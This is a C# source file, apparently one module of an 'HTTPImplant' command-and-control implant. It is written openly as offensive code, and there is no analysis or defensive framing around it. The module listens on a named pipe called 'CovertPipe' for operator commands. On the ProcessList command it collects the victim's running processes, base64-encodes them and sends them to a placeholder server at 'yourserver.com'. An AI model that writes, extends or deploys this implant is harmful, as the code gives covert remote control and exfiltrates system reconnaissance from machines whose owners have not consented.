using System;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Net;
using System.Text;
using System.Threading;

namespace HTTPImplant.Modules
{
    internal class SMBServer
    {
        public enum Command
        {
            ProcessList,
            Exit,
        }

        private const string pipeName = "CovertPipe";

        public void StartServer()
        {
            Thread namedPipeServerThread = new Thread(ServerThread);
            namedPipeServerThread.Start();
            namedPipeServerThread.Join();
        }

        private void ServerThread()
        {
            try
            {
                using (NamedPipeServerStream serverPipe = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 1, PipeTransmissionMode.Byte, PipeOptions.None))
                {
                    Console.WriteLine("Named pipe server is waiting for connection...");

                    serverPipe.WaitForConnection();

                    Console.WriteLine("Client connected.");

                    using (StreamReader reader = new StreamReader(serverPipe))
                    using (StreamWriter writer = new StreamWriter(serverPipe) { AutoFlush = true })
                    {
                        while (true)
                        {
                            string commandStr = reader.ReadLine();
                            if (commandStr == null) continue;

                            Command command = (Command)Enum.Parse(typeof(Command), commandStr);
                            switch (command)
                            {
                                case Command.ProcessList:
                                    {
                                        StringBuilder sb = new StringBuilder();

                                        foreach (Process process in Process.GetProcesses())
                                            sb.AppendLine($"({process.Id.ToString().PadRight(5, ' ')}){process.ProcessName}");

                                        string jsonData = "{\"Command\":\"" + command.ToString() + "\", \"Data\":\"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(sb.ToString())) + "\"}";
                                        SendDataToServer(jsonData);
                                        break;
                                    }
                                case Command.Exit:
                                    return; // Exit the server loop
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Server encountered an error: " + ex.Message);
            }
        }

        private void SendDataToServer(string jsonData)
        {
            using (WebClient client = new WebClient())
            {
                client.Headers[HttpRequestHeader.ContentType] = "application/json";
                try
                {
                    string response = client.UploadString("http://yourserver.com/api/endpoint", jsonData);
                    Console.WriteLine("Response from server: " + response);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Error sending data to server: " + ex.Message);
                }
            }
        }
    }
}
